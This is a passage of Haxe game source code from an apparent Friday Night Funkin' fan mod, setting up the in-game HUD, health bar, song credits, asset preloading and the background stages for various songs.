		strumLine = new FlxSprite(0, 50).makeGraphic(FlxG.width, 10);
		strumLine.scrollFactor.set();
		
		if (scrollType == 'downscroll')
			strumLine.y = FlxG.height - 165;

		strumLineNotes = new FlxTypedGroup<StrumNote>();
		add(strumLineNotes);

		playerStrums = new FlxTypedGroup<StrumNote>();

		dadStrums = new FlxTypedGroup<StrumNote>();

		generateSong(SONG.song);

		camFollow = new FlxObject(0, 0, 1, 1);

		camFollow.setPosition(camPos.x, camPos.y);

		if (prevCamFollow != null)
		{
			camFollow = prevCamFollow;
			prevCamFollow = null;
		}

		add(camFollow);

		FlxG.camera.follow(camFollow, LOCKON, 0.01);
		// FlxG.camera.setScrollBounds(0, FlxG.width, 0, FlxG.height);
		FlxG.camera.zoom = defaultCamZoom;
		FlxG.camera.focusOn(camFollow.getPosition());

		FlxG.worldBounds.set(0, 0, FlxG.width, FlxG.height);

		FlxG.fixedTimestep = false;

		//char repositioning
		repositionChar(dad);
		if (dadmirror != null)
		{
			repositionChar(dadmirror);
		}
		repositionChar(boyfriend);
		repositionChar(gf);

		var font:String = Paths.font("comic.ttf");
		var fontScaler:Int = 1;
	
		switch (SONG.song.toLowerCase())
		{
			case 'five-nights':
				font = Paths.font('fnaf.ttf');
				fontScaler = 2;
		}

		if (FlxG.save.data.songPosition && !isGreetingsCutscene && !['five-nights', 'overdrive'].contains(SONG.song.toLowerCase()))
		{
			var yPos = scrollType == 'downscroll' ? FlxG.height * 0.9 + 20 : strumLine.y - 20;

			songPosBG = new FlxSprite(0, yPos).loadGraphic(Paths.image('ui/timerBar'));
			songPosBG.antialiasing = true;
			songPosBG.screenCenter(X);
			songPosBG.scrollFactor.set();
			add(songPosBG);
			
			songPosBar = new FlxBar(songPosBG.x + 4, songPosBG.y + 4, LEFT_TO_RIGHT, Std.int(songPosBG.width - 8), Std.int(songPosBG.height - 8), Conductor, 
			'songPosition', 0, FlxG.sound.music.length);
			songPosBar.scrollFactor.set();
			songPosBar.createFilledBar(FlxColor.GRAY, FlxColor.fromRGB(57, 255, 20));
			insert(members.indexOf(songPosBG), songPosBar);
			
			songName = new FlxText(songPosBG.x, songPosBG.y, 0, "", 32);
			songName.text = (barType == 'ShowTime' ? '0:00' : barType == 'SongName' ? SONG.song : '');
			songName.setFormat(font, 32 * fontScaler, FlxColor.WHITE, CENTER, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
			
			songName.scrollFactor.set();
			songName.borderSize = 2.5 * fontScaler;
			songName.antialiasing = true;
			if (barType == 'ShowTime')
			{
				songName.alpha = 0;
			}

			var xValues = CoolUtil.getMinAndMax(songName.width, songPosBG.width);
			var yValues = CoolUtil.getMinAndMax(songName.height, songPosBG.height);
			
			songName.x = songPosBG.x - ((xValues[0] - xValues[1]) / 2);
			songName.y = songPosBG.y + ((yValues[0] - yValues[1]) / 2);

			add(songName);

			songPosBG.cameras = [camHUD];
			songPosBar.cameras = [camHUD];
			songName.cameras = [camHUD];
		}
		if (inFiveNights)
		{
			time = new FlxText(1175, 24, 0, '12 AM', 60);
			time.setFormat(Paths.font('fnaf.ttf'), 60, FlxColor.WHITE, FlxTextAlign.RIGHT, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
			time.scrollFactor.set();
			time.antialiasing = false;
			time.borderSize = 2.5;
			time.cameras = [camHUD];
			add(time);

			night = new FlxText(1175, 70, 0, 'Night 7', 34);
			night.setFormat(Paths.font('fnaf.ttf'), 34, FlxColor.WHITE, FlxTextAlign.RIGHT, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
			night.scrollFactor.set();
			night.antialiasing = false;
			night.borderSize = 2.5;
			night.cameras = [camHUD];
			add(night);

			powerLeftText = new FlxText(1100, 650, 0, 'Power Left: 100%', 34);
			powerLeftText.setFormat(Paths.font('fnaf.ttf'), 34, FlxColor.WHITE, FlxTextAlign.RIGHT, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
			powerLeftText.scrollFactor.set();
			powerLeftText.antialiasing = false;
			powerLeftText.borderSize = 2;
			powerLeftText.cameras = [camHUD];
			add(powerLeftText);

			usage = new FlxText(1100, 685, 0, 'Usage: ', 34);
			usage.setFormat(Paths.font('fnaf.ttf'), 34, FlxColor.WHITE, FlxTextAlign.RIGHT, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
			usage.scrollFactor.set();
			usage.antialiasing = false;
			usage.borderSize = 2;
			usage.cameras = [camHUD];
			add(usage);
			
			powerMeter = new FlxSprite(1170, 683).loadGraphic(Paths.image('fiveNights/powerMeter'));
			powerMeter.scrollFactor.set();
			powerMeter.cameras = [camHUD];
			add(powerMeter);
		}
		
		var healthBarPath = '';
		switch (SONG.song.toLowerCase())
		{
			case 'exploitation':
				healthBarPath = Paths.image('ui/HELLthBar');
			case 'overdrive':
				healthBarPath = Paths.image('ui/fnfengine');
			case 'five-nights':
				healthBarPath = Paths.image('ui/fnafengine');
			default:
				healthBarPath = Paths.image('ui/healthBar');
		}

		healthBarBG = new FlxSprite(0, FlxG.height * 0.9).loadGraphic(healthBarPath);
		if (scrollType == 'downscroll')
			healthBarBG.y = 50;
		healthBarBG.screenCenter(X);
		healthBarBG.scrollFactor.set();
		healthBarBG.antialiasing = true;
		add(healthBarBG);

		healthBar = new FlxBar(healthBarBG.x + 4, healthBarBG.y + 4, inFiveNights ? LEFT_TO_RIGHT : RIGHT_TO_LEFT, Std.int(healthBarBG.width - 8), Std.int(healthBarBG.height - 8), this,
			'health', 0, 2);
		healthBar.scrollFactor.set();
		healthBar.createFilledBar(dad.barColor, boyfriend.barColor);
		insert(members.indexOf(healthBarBG), healthBar);

		var credits:String;
		switch (SONG.song.toLowerCase())
		{
			case 'supernovae':
				credits = LanguageManager.getTextString('supernovae_credit');
			case 'glitch':
				credits = LanguageManager.getTextString('glitch_credit');
			case 'unfairness':
				credits = LanguageManager.getTextString('unfairness_credit');
			case 'cheating':
				credits = LanguageManager.getTextString('cheating_credit');
			case 'exploitation':
				credits = LanguageManager.getTextString('exploitation_credit') + " " + (FlxG.save.data.selfAwareness ? CoolSystemStuff.getUsername() : 'Boyfriend') + "!";
			case 'kabunga':
				credits = LanguageManager.getTextString('kabunga_credit');
			default:
				credits = '';
		}
		var creditsText:Bool = credits != '';
		var textYPos:Float = healthBarBG.y + 50;
		if (creditsText)
		{
			textYPos = healthBarBG.y + 30;
		}
		
		var funkyText:String;

		switch(SONG.song.toLowerCase())
		{
			case "exploitation":
				funkyText = SONG.song;
			case 'overdrive':
				funkyText = '';
			default:
				funkyText = SONG.song;
		}

		if (!isGreetingsCutscene)
		{
			kadeEngineWatermark = new FlxText(4, textYPos, 0, funkyText, 16);

			kadeEngineWatermark.setFormat(font, 16 * fontScaler, FlxColor.WHITE, CENTER, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
			kadeEngineWatermark.scrollFactor.set();
			kadeEngineWatermark.borderSize = 1.25 * fontScaler;
			kadeEngineWatermark.antialiasing = true;
			add(kadeEngineWatermark);
		}
		if (creditsText)
		{
			creditsWatermark = new FlxText(4, healthBarBG.y + 50, 0, credits, 16);
			creditsWatermark.setFormat(font, 16 * fontScaler, FlxColor.WHITE, CENTER, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
			creditsWatermark.scrollFactor.set();
			creditsWatermark.borderSize = 1.25 * fontScaler;
			creditsWatermark.antialiasing = true;
			add(creditsWatermark);
			creditsWatermark.cameras = [camHUD];
		}
		switch (curSong.toLowerCase())
		{
			case 'insanity':
				preload('backgrounds/void/redsky');
				preload('backgrounds/void/redsky_insanity');
			case 'polygonized':
				preload('characters/3d_bf');
				preload('characters/3d_gf');
			case 'maze':
				preload('spotLight');
			case 'shredder':
				preload('festival/bambi_shredder');
				for (asset in ['bambi_spot', 'boyfriend_spot', 'ch_highway'])
				{
					preload('festival/shredder/${asset}');
				}
			case 'interdimensional':
				preload('backgrounds/void/interdimensions/interdimensionVoid');
				preload('backgrounds/void/interdimensions/spike');
				preload('backgrounds/void/interdimensions/darkSpace');
				preload('backgrounds/void/interdimensions/hexagon');
				preload('backgrounds/void/interdimensions/nimbi/nimbiVoid');
				preload('backgrounds/void/interdimensions/nimbi/nimbi_land');
				preload('backgrounds/void/interdimensions/nimbi/nimbi');
			case 'mealie':
				preload('bambi/im_gonna_break_me_phone');
			case 'recursed':
				switch (boyfriend.curCharacter)
				{
					case 'dave':
						preload('recursed/characters/Dave_Recursed');
					case 'bambi-new':
						preload('recursed/characters/Bambi_Recursed');
					case 'tb-funny-man':
						preload('recursed/characters/STOP_LOOKING_AT_THE_FILES');
					case 'tristan' | 'tristan-golden':
						preload('recursed/characters/TristanRecursed');
					case 'dave-angey':
						preload('recursed/characters/Dave_3D_Recursed');
					default:
						preload('recursed/Recursed_BF');
				}
			case 'exploitation':
				preload('ui/glitch/glitchSwitch');
				preload('backgrounds/void/exploit/cheater GLITCH');
				preload('backgrounds/void/exploit/glitchyUnfairBG');
				preload('backgrounds/void/exploit/expunged_chains');
				preload('backgrounds/void/exploit/broken_expunged_chain');
				preload('backgrounds/void/exploit/glitchy_cheating_2');
			case 'bot-trot':
				preload('backgrounds/bedroom/night/bed');
				preload('backgrounds/bedroom/night/bg');
				preload('playrobot/playrobot_shadow');
			case 'escape-from-california':
				for (spr in ['1500miles', '1000miles', '500miles', 'welcomeToGeorgia', 'georgia'])
				{
					preload('california/$spr');
				}
		}

		scoreTxt = new FlxText(healthBarBG.x + healthBarBG.width / 2 - 150, healthBarBG.y + 40, FlxG.width, "", 20);
		scoreTxt.setFormat((SONG.song.toLowerCase() == "overdrive") ? Paths.font("ariblk.ttf") : font, 20 * fontScaler, FlxColor.WHITE, CENTER, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
		scoreTxt.scrollFactor.set();
		scoreTxt.borderSize = 1.5 * fontScaler;
		scoreTxt.antialiasing = true;
		scoreTxt.screenCenter(X);
		add(scoreTxt);

		if (inFiveNights)
		{
			iconP2 = new HealthIcon((formoverride == "none" || formoverride == "bf") ? SONG.player1 : formoverride, false);
			iconP2.y = healthBar.y - (iconP2.height / 2);
			add(iconP2);

			iconP1 = new HealthIcon(SONG.player2 == "bambi" ? "bambi-stupid" : SONG.player2, true);
			iconP1.y = healthBar.y - (iconP1.height / 2);
			add(iconP1);
		}
		else
		{
			iconP1 = new HealthIcon((formoverride == "none" || formoverride == "bf") ? SONG.player1 : formoverride, true);
			iconP1.y = healthBar.y - (iconP1.height / 2);
			add(iconP1);

			iconP2 = new HealthIcon(SONG.player2 == "bambi" ? "bambi-stupid" : SONG.player2, false);
			iconP2.y = healthBar.y - (iconP2.height / 2);
			add(iconP2);
		}
		strumLineNotes.cameras = [camHUD];
		notes.cameras = [camHUD];
		healthBar.cameras = [camHUD];
		healthBarBG.cameras = [camHUD];
		iconP1.cameras = [camHUD];
		iconP2.cameras = [camHUD];
		scoreTxt.cameras = [camHUD];
		if (kadeEngineWatermark != null)
		{
			kadeEngineWatermark.cameras = [camHUD];
		}
		doof.cameras = [camDialogue];
    
		#if (SHADERS_ENABLED || mac)
		if (SONG.song.toLowerCase() == 'kabunga'
			|| localFunny == CharacterFunnyEffect.Exbungo) // i desperately wanted it so if you use downscroll it switches it to upscroll and flips the entire hud upside down but i never got to it
		{
			lazychartshader.waveAmplitude = 0.03;
			lazychartshader.waveFrequency = 5;
			lazychartshader.waveSpeed = 1;

			camHUD.setFilters([new ShaderFilter(lazychartshader.shader)]);
		}
		#end
		#if SHADERS_ENABLED
		if (SONG.song.toLowerCase() == 'blocked' || SONG.song.toLowerCase() == 'shredder')
		{
			blockedShader = new BlockedGlitchEffect(1280, 1, 1, true);
		}
		#end
		startingSong = true;
		if (startTimer != null && !startTimer.active)
		{
			startTimer.active = true;
		}
		if (isStoryMode || localFunny == CharacterFunnyEffect.Recurser)
		{
			if (hasDialogue)
			{
				schoolIntro(doof);
			}
			else
			{
				if (FlxG.sound.music != null)
					FlxG.sound.music.stop();
				startCountdown();
			}
		}
		else
		{
			switch (curSong.toLowerCase())
			{
				default:
					startCountdown();
			}
		}
		
		subtitleManager = new SubtitleManager();
		subtitleManager.cameras = [camHUD];
		add(subtitleManager);

		exbungo_funny = FlxG.sound.load(Paths.sound('amen_' + FlxG.random.int(1, 6)));
		exbungo_funny.volume = 0.91;

		super.create();

		Transition.nextCamera = camTransition;
	}
	
	public function createBackgroundSprites(bgName:String, revertedBG:Bool):FlxTypedGroup<BGSprite>
	{
		var sprites:FlxTypedGroup<BGSprite> = new FlxTypedGroup<BGSprite>();
		var bgZoom:Float = 0.7;
		var stageName:String = '';
		switch (bgName)
		{
			case 'house' | 'house-night' | 'house-sunset':
				bgZoom = 0.8;
				
				var skyType:String = '';
				var assetType:String = '';
				switch (bgName)
				{
					case 'house':
						stageName = 'daveHouse';
						skyType = 'sky';
					case 'house-night':
						stageName = 'daveHouse_night';
						skyType = 'sky_night';
						assetType = 'night/';
					case 'house-sunset':
						stageName = 'daveHouse_sunset';
						skyType = 'sky_sunset';
				}
				var bg:BGSprite = new BGSprite('bg', -600, -300, Paths.image('backgrounds/shared/${skyType}'), null, 0.6, 0.6);
				sprites.add(bg);
				add(bg);
				
				var stageHills:BGSprite = new BGSprite('stageHills', -834, -159, Paths.image('backgrounds/dave-house/${assetType}hills'), null, 0.7, 0.7);
				sprites.add(stageHills);
				add(stageHills);

				var grassbg:BGSprite = new BGSprite('grassbg', -1205, 580, Paths.image('backgrounds/dave-house/${assetType}grass bg'), null);
				sprites.add(grassbg);
				add(grassbg);
	
				var gate:BGSprite = new BGSprite('gate', -755, 250, Paths.image('backgrounds/dave-house/${assetType}gate'), null);
				sprites.add(gate);
				add(gate);
	
				var stageFront:BGSprite = new BGSprite('stageFront', -832, 505, Paths.image('backgrounds/dave-house/${assetType}grass'), null);
				sprites.add(stageFront);
				add(stageFront);

				if (SONG.song.toLowerCase() == 'insanity' || localFunny == CharacterFunnyEffect.Recurser)
				{
					var bg:BGSprite = new BGSprite('bg', -600, -200, Paths.image('backgrounds/void/redsky_insanity'), null, 1, 1, true, true);
					bg.alpha = 0.75;
					bg.visible = false;
					add(bg);
					// below code assumes shaders are always enabled which is bad
					voidShader(bg);
				}

				var variantColor = getBackgroundColor(stageName);
				if (stageName != 'daveHouse_night')
				{
					stageHills.color = variantColor;
					grassbg.color = variantColor;
					gate.color = variantColor;
					stageFront.color = variantColor;
				}
			case 'inside-house':
				bgZoom = 0.6;
				stageName = 'insideHouse';

				var bg:BGSprite = new BGSprite('bg', -1000, -350, Paths.image('backgrounds/inside_house'), null);
				sprites.add(bg);
				add(bg);

			case 'farm' | 'farm-night' | 'farm-sunset':
				bgZoom = 0.8;

				switch (bgName.toLowerCase())
				{
					case 'farm-night':
						stageName = 'bambiFarmNight';
					case 'farm-sunset':
						stageName = 'bambiFarmSunset';
					default:
						stageName = 'bambiFarm';
				}
	
				var skyType:String = stageName == 'bambiFarmNight' ? 'sky_night' : stageName == 'bambiFarmSunset' ? 'sky_sunset' : 'sky';
				
				var bg:BGSprite = new BGSprite('bg', -600, -200, Paths.image('backgrounds/shared/' + skyType), null, 0.6, 0.6);
				sprites.add(bg);
				add(bg);

				if (SONG.song.toLowerCase() == 'maze')
				{
					var sunsetBG:BGSprite = new BGSprite('sunsetBG', -600, -200, Paths.image('backgrounds/shared/sky_sunset'), null, 0.6, 0.6);
					sunsetBG.alpha = 0;
					sprites.add(sunsetBG);
					add(sunsetBG);

					var nightBG:BGSprite = new BGSprite('nightBG', -600, -200, Paths.image('backgrounds/shared/sky_night'), null, 0.6, 0.6);
					nightBG.alpha = 0;
					sprites.add(nightBG);
					add(nightBG);
					if (isStoryMode)
					{
						health -= 0.2;
					}
				}
				var flatgrass:BGSprite = new BGSprite('flatgrass', 350, 75, Paths.image('backgrounds/farm/gm_flatgrass'), null, 0.65, 0.65);
				flatgrass.setGraphicSize(Std.int(flatgrass.width * 0.34));
				flatgrass.updateHitbox();
				sprites.add(flatgrass);
				
				var hills:BGSprite = new BGSprite('hills', -173, 100, Paths.image('backgrounds/farm/orangey hills'), null, 0.65, 0.65);
				sprites.add(hills);
				
				var farmHouse:BGSprite = new BGSprite('farmHouse', 100, 125, Paths.image('backgrounds/farm/funfarmhouse', 'shared'), null, 0.7, 0.7);
				farmHouse.setGraphicSize(Std.int(farmHouse.width * 0.9));
				farmHouse.updateHitbox();
				sprites.add(farmHouse);

				var grassLand:BGSprite = new BGSprite('grassLand', -600, 500, Paths.image('backgrounds/farm/grass lands', 'shared'), null);
				sprites.add(grassLand);

				var cornFence:BGSprite = new BGSprite('cornFence', -400, 200, Paths.image('backgrounds/farm/cornFence', 'shared'), null);
				sprites.add(cornFence);
				
				var cornFence2:BGSprite = new BGSprite('cornFence2', 1100, 200, Paths.image('backgrounds/farm/cornFence2', 'shared'), null);
				sprites.add(cornFence2);

				var bagType = FlxG.random.int(0, 1000) == 0 ? 'popeye' : 'cornbag';
				var cornBag:BGSprite = new BGSprite('cornFence2', 1200, 550, Paths.image('backgrounds/farm/$bagType', 'shared'), null);
				sprites.add(cornBag);
				
				var sign:BGSprite = new BGSprite('sign', 0, 350, Paths.image('backgrounds/farm/sign', 'shared'), null);
				sprites.add(sign);

				var variantColor:FlxColor = getBackgroundColor(stageName);
				
				flatgrass.color = variantColor;
				hills.color = variantColor;
				farmHouse.color = variantColor;
				grassLand.color = variantColor;
				cornFence.color = variantColor;
				cornFence2.color = variantColor;
				cornBag.color = variantColor;
				sign.color = variantColor;
				
				add(flatgrass);
				add(hills);
				add(farmHouse);
				add(grassLand);
				add(cornFence);
				add(cornFence2);
				add(cornBag);
				add(sign);

				if (['blocked', 'corn-theft', 'maze', 'mealie', 'indignancy'].contains(SONG.song.toLowerCase()) && !MathGameState.failedGame && FlxG.random.int(0, 4) == 0)
				{
					FlxG.mouse.visible = true;
					baldi = new BGSprite('baldi', 400, 110, Paths.image('backgrounds/farm/baldo', 'shared'), null, 0.65, 0.65);
					baldi.setGraphicSize(Std.int(baldi.width * 0.31));
					baldi.updateHitbox();
					baldi.color = variantColor;
					sprites.insert(members.indexOf(hills), baldi);
					insert(members.indexOf(hills), baldi);
				}

				if (SONG.song.toLowerCase() == 'splitathon')
				{
					var picnic:BGSprite = new BGSprite('picnic', 1050, 650, Paths.image('backgrounds/farm/picnic_towel_thing', 'shared'), null);
					sprites.insert(sprites.members.indexOf(cornBag), picnic);
					picnic.color = variantColor;
					insert(members.indexOf(cornBag), picnic);
				}
			case 'festival':
				bgZoom = 0.7;
				stageName = 'festival';
				
				var mainChars:Array<Dynamic> = null;
				switch (SONG.song.toLowerCase())
				{
					case 'shredder':
						mainChars = [
							//char name, prefix, size, x, y, flip x
							['dave', 'idle', 0.8, 175, 100],
							['tristan', 'bop', 0.4, 800, 325]
						];
					case 'greetings':
						if (isGreetingsCutscene)
						{
							mainChars = [
								['bambi', 'bambi idle', 0.9, 400, 350],
								['tristan', 'bop', 0.4, 800, 325]
							];
						}
						else
						{
							mainChars = [
								['dave', 'idle', 0.8, 175, 100],
								['bambi', 'bambi idle', 0.9, 700, 350],
							];
						}
					case 'interdimensional':
						mainChars = [
							['bambi', 'bambi idle', 0.9, 400, 350],
							['tristan', 'bop', 0.4, 800, 325]
						];
				}
				var bg:BGSprite = new BGSprite('bg', -600, -230, Paths.image('backgrounds/shared/sky_festival'), null, 0.6, 0.6);
				sprites.add(bg);
				add(bg);

				var flatGrass:BGSprite = new BGSprite('flatGrass', 800, -100, Paths.image('backgrounds/festival/gm_flatgrass'), null, 0.7, 0.7);
				sprites.add(flatGrass);
				add(flatGrass);

				var farmHouse:BGSprite = new BGSprite('farmHouse', -300, -150, Paths.image('backgrounds/festival/farmHouse'), null, 0.7, 0.7);
				sprites.add(farmHouse);
				add(farmHouse);
				
				var hills:BGSprite = new BGSprite('hills', -1000, -100, Paths.image('backgrounds/festival/hills'), null, 0.7, 0.7);
				sprites.add(hills);
				add(hills);

				var corn:BGSprite = new BGSprite('corn', -1000, 120, 'backgrounds/festival/corn', [
					new Animation('corn', 'idle', 5, true, [false, false])
				], 0.85, 0.85, true, true);
				corn.animation.play('corn');
				sprites.add(corn);
				add(corn);

				var cornGlow:BGSprite = new BGSprite('cornGlow', -1000, 120, 'backgrounds/festival/cornGlow', [
					new Animation('cornGlow', 'idle', 5, true, [false, false])
				], 0.85, 0.85, true, true);
				cornGlow.blend = BlendMode.ADD;
				cornGlow.animation.play('cornGlow');
				sprites.add(cornGlow);
				add(cornGlow);
				
				var backGrass:BGSprite = new BGSprite('backGrass', -1000, 475, Paths.image('backgrounds/festival/backGrass'), null, 0.85, 0.85);
				sprites.add(backGrass);
				add(backGrass);
				
				var crowd = new BGSprite('crowd', -500, -150, 'backgrounds/festival/crowd', [
					new Animation('idle', 'crowdDance', 24, true, [false, false])
				], 0.85, 0.85, true, true);
				crowd.animation.play('idle');
				sprites.add(crowd);
				crowdPeople.add(crowd);
				add(crowd);
				
				for (i in 0...mainChars.length)
				{					
					var crowdChar = new BGSprite(mainChars[i][0], mainChars[i][3], mainChars[i][4], 'backgrounds/festival/mainCrowd/${mainChars[i][0]}', [
						new Animation('idle', mainChars[i][1], 24, false, [false, false], null)
					], 0.85, 0.85, true, true);
					crowdChar.setGraphicSize(Std.int(crowdChar.width * mainChars[i][2]));
					crowdChar.updateHitbox();
					sprites.add(crowdChar);
					crowdPeople.add(crowdChar);
					add(crowdChar);
				}
				
				var frontGrass:BGSprite = new BGSprite('frontGrass', -1300, 600, Paths.image('backgrounds/festival/frontGrass'), null, 1, 1);
				sprites.add(frontGrass);
				add(frontGrass);

				var stageGlow:BGSprite = new BGSprite('stageGlow', -450, 300, 'backgrounds/festival/generalGlow', [
					new Animation('glow', 'idle', 5, true, [false, false])
				], 0, 0, true, true);
				stageGlow.blend = BlendMode.ADD;
				stageGlow.animation.play('glow');
				sprites.add(stageGlow);
				add(stageGlow);

			case 'backyard':
				bgZoom = 0.7;
				stageName = 'backyard';

				var festivalSky:BGSprite = new BGSprite('bg', -600, -400, Paths.image('backgrounds/shared/sky_festival'), null, 0.6, 0.6);
				sprites.add(festivalSky);
				add(festivalSky);

				if (SONG.song.toLowerCase() == 'rano')
				{
					var sunriseBG:BGSprite = new BGSprite('sunriseBG', -600, -400, Paths.image('backgrounds/shared/sky_sunrise'), null, 0.6, 0.6);
					sunriseBG.alpha = 0;
					sprites.add(sunriseBG);
					add(sunriseBG);

					var skyBG:BGSprite = new BGSprite('bg', -600, -400, Paths.image('backgrounds/shared/sky'), null, 0.6, 0.6);
					skyBG.alpha = 0;
					sprites.add(skyBG);
					add(skyBG);
				}

				var hills:BGSprite = new BGSprite('hills', -1330, -432, Paths.image('backgrounds/backyard/hills', 'shared'), null, 0.75, 0.75, true);
				sprites.add(hills);
				add(hills);

				var grass:BGSprite = new BGSprite('grass', -800, 150, Paths.image('backgrounds/backyard/supergrass', 'shared'), null, 1, 1, true);
				sprites.add(grass);
				add(grass);

				var gates:BGSprite = new BGSprite('gates', 564, -33, Paths.image('backgrounds/backyard/gates', 'shared'), null, 1, 1, true);
				sprites.add(gates);
				add(gates);
				
				var bear:BGSprite = new BGSprite('bear', -1035, -710, Paths.image('backgrounds/backyard/bearDude', 'shared'), null, 0.95, 0.95, true);
				sprites.add(bear);
				add(bear);

				var house:BGSprite = new BGSprite('house', -1025, -323, Paths.image('backgrounds/backyard/house', 'shared'), null, 0.95, 0.95, true);
				sprites.add(house);
				add(house);

				var grill:BGSprite = new BGSprite('grill', -489, 452, Paths.image('backgrounds/backyard/grill', 'shared'), null, 0.95, 0.95, true);
				sprites.add(grill);
				add(grill);

				var variantColor = getBackgroundColor(stageName);

				hills.color = variantColor;
				bear.color = variantColor;
				grass.color = variantColor;
				gates.color = variantColor;
				house.color = variantColor;
				grill.color = variantColor;
			case 'desktop':
				bgZoom = 0.5;
				stageName = 'desktop';

				expungedBG = new BGSprite('void', -600, -200, '', null, 1, 1, false, true);
				expungedBG.loadGraphic(Paths.image('backgrounds/void/exploit/creepyRoom', 'shared'));
				expungedBG.setPosition(0, 200);
				expungedBG.setGraphicSize(Std.int(expungedBG.width * 2));
				expungedBG.scrollFactor.set();
				expungedBG.antialiasing = false;
				sprites.add(expungedBG);
				add(expungedBG);
				voidShader(expungedBG);
			case 'red-void' | 'green-void' | 'glitchy-void':
				bgZoom = 0.7;

				var bg:BGSprite = new BGSprite('void', -600, -200, '', null, 1, 1, false, true);
				
				switch (bgName.toLowerCase())
				{
					case 'red-void':
						bgZoom = 0.8;
						bg.loadGraphic(Paths.image('backgrounds/void/redsky', 'shared'));
						stageName = 'daveEvilHouse';
					case 'green-void':
						stageName = 'cheating';
						bg.loadGraphic(Paths.image('backgrounds/void/cheater'));
						bg.setPosition(-700, -350);
						bg.setGraphicSize(Std.int(bg.width * 2));
					case 'glitchy-void':
						bg.loadGraphic(Paths.image('backgrounds/void/scarybg'));
						bg.setPosition(0, 200);
						bg.setGraphicSize(Std.int(bg.width * 3));
						stageName = 'unfairness';
				}
				sprites.add(bg);
				add(bg);
				voidShader(bg);
			case 'interdimension-void':
				bgZoom = 0.6;
				stageName = 'interdimension';

				var bg:BGSprite = new BGSprite('void', -700, -350, Paths.image('backgrounds/void/interdimensions/interdimensionVoid'), null, 1, 1, false, true);
				bg.setGraphicSize(Std.int(bg.width * 1.75));
				sprites.add(bg);
				add(bg);

				voidShader(bg);
				
				interdimensionBG = bg;

				for (char in ['ball', 'bimpe', 'maldo', 'memes kids', 'muko', 'ruby man', 'tristan', 'bambi'])
				{
					var bgChar = new FlyingBGChar(char, Paths.image('backgrounds/festival/scaredCrowd/$char'));
					sprites.add(bgChar);
					flyingBgChars.add(bgChar);
				}
				add(flyingBgChars);
			case 'exbungo-land':
				bgZoom = 0.7;
				stageName = 'kabunga';
				
				var bg:BGSprite = new BGSprite('bg', -320, -160, Paths.image('backgrounds/void/exbongo/Exbongo'), null, 1, 1, true, true);
				bg.setGraphicSize(Std.int(bg.width * 1.5));
				sprites.add(bg);
				add(bg);

				var circle:BGSprite = new BGSprite('circle', -30, 550, Paths.image('backgrounds/void/exbongo/Circle'), null);
				sprites.add(circle);	
				add(circle);

				place = new BGSprite('place', 860, -15, Paths.image('backgrounds/void/exbongo/Place'), null);
				sprites.add(place);	
				add(place);
				
				voidShader(bg);
			case 'rapBattle':
				bgZoom = 1;
				stageName = 'rapLand';

				var bg:BGSprite = new BGSprite('rapBG', -640, -360, Paths.image('backgrounds/rapBattle'), null);
				sprites.add(bg);
				add(bg);
			case 'freeplay':
				bgZoom = 0.4;
				stageName = 'freeplay';
				
				darkSky = new BGSprite('darkSky', darkSkyStartPos, 0, Paths.image('recursed/darkSky'), null, 1, 1, true);
				darkSky.scale.set((1 / bgZoom) * 2, 1 / bgZoom);
				darkSky.updateHitbox();
				darkSky.y = (FlxG.height - darkSky.height) / 2;
				add(darkSky);
				
				darkSky2 = new BGSprite('darkSky', darkSky.x - darkSky.width, 0, Paths.image('recursed/darkSky'), null, 1, 1, true);
				darkSky2.scale.set((1 / bgZoom) * 2, 1 / bgZoom);
				darkSky2.updateHitbox();
				darkSky2.x = darkSky.x - darkSky.width;
				darkSky2.y = (FlxG.height - darkSky2.height) / 2;
				add(darkSky2);

				freeplayBG = new BGSprite('freeplay', 0, 0, daveBG, null, 0, 0, true);
				freeplayBG.setGraphicSize(Std.int(freeplayBG.width * 2));
				freeplayBG.updateHitbox();
				freeplayBG.screenCenter();
				freeplayBG.color = FlxColor.multiply(0xFF4965FF, FlxColor.fromRGB(44, 44, 44));
				freeplayBG.alpha = 0;
				add(freeplayBG);
				
				charBackdrop = new FlxBackdrop(Paths.image('recursed/daveScroll'), 1, 1, true, true);
				charBackdrop.antialiasing = true;
				charBackdrop.scale.set(2, 2);
				charBackdrop.screenCenter();
				charBackdrop.color = FlxColor.multiply(charBackdrop.color, FlxColor.fromRGB(44, 44, 44));
				charBackdrop.alpha = 0;
				add(charBackdrop);

				initAlphabet(daveSongs);
			case 'roof':
				bgZoom = 0.8;
				stageName = 'roof';
				var roof:BGSprite = new BGSprite('roof', -584, -397, Paths.image('backgrounds/gm_house5', 'shared'), null, 1, 1, true);
				roof.setGraphicSize(Std.int(roof.width * 2));
				roof.antialiasing = false;
				add(roof);
			case 'bedroom':
				bgZoom = 0.8;
				stageName = 'bedroom';
				
				var sky:BGSprite = new BGSprite('nightSky', -285, 318, Paths.image('backgrounds/bedroom/sky', 'shared'), null, 0.8, 0.8, true);
				sprites.add(sky);
				add(sky);

				var bg:BGSprite = new BGSprite('bg', -687, 0, Paths.image('backgrounds/bedroom/bg', 'shared'), null, 1, 1, true);
				sprites.add(bg);
				add(bg);

				var baldi:BGSprite = new BGSprite('baldi', 788, 788, Paths.image('backgrounds/bedroom/bed', 'shared'), null, 1, 1, true);
				sprites.add(baldi);
				add(baldi);

				tristanInBotTrot = new BGSprite('tristan', 888, 688, 'backgrounds/bedroom/TristanSitting', [
					new Animation('idle', 'daytime', 24, true, [false, false]),
					new Animation('idleNight', 'nighttime', 24, true, [false, false])
				], 1, 1, true, true);
				tristanInBotTrot.setGraphicSize(Std.int(tristanInBotTrot.width * 0.8));
				tristanInBotTrot.animation.play('idle');
				add(tristanInBotTrot);
				if (formoverride == 'tristan' || formoverride == 'tristan-golden' || formoverride == 'tristan-golden-glowing') {
					remove(tristanInBotTrot);	
			    }
			case 'office':
				bgZoom = 0.9;
				stageName = 'office';
				
				var backFloor:BGSprite = new BGSprite('backFloor', -500, -310, Paths.image('backgrounds/office/backFloor'), null, 1, 1);
				sprites.add(backFloor);
				add(backFloor);
			case 'desert':
				bgZoom = 0.5;
				stageName = 'desert';

